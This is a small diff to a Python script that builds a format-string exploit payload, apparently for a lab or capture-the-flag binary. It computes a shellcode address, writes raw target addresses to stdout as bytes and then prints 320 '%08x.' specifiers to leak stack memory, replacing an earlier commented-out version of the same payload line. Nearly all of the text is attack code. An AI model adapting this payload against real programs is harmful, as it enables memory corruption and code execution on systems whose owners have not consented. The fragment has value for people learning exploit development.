@@ -14,5 +14,8 @@ ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
 ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
 LENTGHOFREQUIRED = 61
 
-print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
-
+#print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
+print("AAAA")
+with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
+    stdout.write(ADDRESSTOWRITE1 + ADDRESSTOWRITE2)
+print("%08x." * 320)
